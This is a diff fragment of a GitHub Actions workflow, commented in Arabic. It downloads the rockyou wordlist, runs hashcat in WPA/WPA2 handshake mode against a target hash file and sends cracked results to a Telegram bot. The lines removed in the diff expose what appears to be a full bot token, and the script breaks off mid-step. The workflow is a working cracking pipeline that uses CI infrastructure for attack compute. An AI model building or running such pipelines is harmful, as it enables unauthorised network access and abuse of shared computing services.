@@ -15,18 +15,27 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y hashcat curl
 
-      - name: Download Big Network Wordlist
+      - name: Download Wordlist
         run: |
-          curl -L -o rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-          gunzip -f rockyou.txt.gz || true
+          # تحميل قاموس rockyou المباشر
+          curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
-      - name: Run Hashcat Cracking
+      - name: Locate Hash File & Run Hashcat
         run: |
-          hashcat -m 22000 target_hash.hc22000 rockyou.txt --potfile-path=result.txt || true
+          # البحث عن ملف الهاش سواء كان في الجذر أو داخل مجلد workflows
+          HASH_FILE="target_hash.hc22000"
+          if [ -f ".github/workflows/target_hash.hc22000" ]; then
+            HASH_FILE=".github/workflows/target_hash.hc22000"
+          fi
+
+          echo "Using Hash File at: $HASH_FILE"
+          
+          # تشغيل التخمين
+          hashcat -m 22000 "$HASH_FILE" rockyou.txt --potfile-path=result.txt || true
 
       - name: Send Telegram Notification
         run: |
-          BOT_TOKEN="8855829659:AAEscvl3G-abK4ks_HYbKY0pTpMRjoO2YwY"
+          BOT_TOKEN="3865820650:AAEscv13G-..." # ضع التوكن كاملاً هنا
           CHAT_ID="6044239374"
 
           if [ -s result.txt ]; then
